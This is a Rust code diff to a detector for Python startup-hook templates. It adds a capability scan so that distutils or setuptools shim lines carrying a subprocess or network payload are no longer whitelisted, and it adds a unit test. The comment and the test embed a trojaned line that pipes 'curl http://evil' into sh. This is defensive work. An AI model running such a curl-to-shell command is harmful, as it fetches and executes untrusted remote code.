@@ -471,7 +471,13 @@ fn is_benign_template(line: &str) -> bool {
         && (norm.ends_with("__import__('_distutils_hack').add_shim()")
             || norm.ends_with("__import__(\"_distutils_hack\").add_shim()"))
     {
-        return true;
+        // Defense in depth (mirrors the namespace template below): the shape match
+        // alone is bypassable, e.g. `import os; os.system('curl|sh'); __import__(
+        // '_distutils_hack').add_shim()`, so a payload capability disqualifies it.
+        let caps = scan_capabilities(line);
+        if !caps.subprocess && !caps.network && !caps.cross_runtime {
+            return true;
+        }
     }
 
     // 2. setuptools editable finder bootstrap, e.g.
@@ -487,7 +493,12 @@ fn is_benign_template(line: &str) -> bool {
                 && module.ends_with("_finder")
                 && tail == format!("{module}.install()")
             {
-                return true;
+                // Defense in depth (mirrors the namespace template): a payload
+                // capability disqualifies the line even when the shape matches.
+                let caps = scan_capabilities(line);
+                if !caps.subprocess && !caps.network && !caps.cross_runtime {
+                    return true;
+                }
             }
         }
     }
@@ -944,6 +955,22 @@ mod tests {
             is_benign_template(line),
             "a canonical namespace bootstrap is benign"
         );
+    }
+
+    /// A line matching the distutils template SHAPE but carrying a payload
+    /// (subprocess/network/cross-runtime) is NOT benign: the capability scan
+    /// disqualifies it, so the hook still fires (closes the template-bypass hole).
+    #[test]
+    fn trojaned_distutils_template_is_not_benign() {
+        let trojan =
+            "import os; os.system('curl http://evil | sh'); __import__('_distutils_hack').add_shim()";
+        assert!(
+            !is_benign_template(trojan),
+            "a distutils shim carrying a subprocess payload must not be benign"
+        );
+        // The canonical (payload-free) shim is still recognized as benign.
+        let canonical = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim()";
+        assert!(is_benign_template(canonical));
     }
 
     #[test]
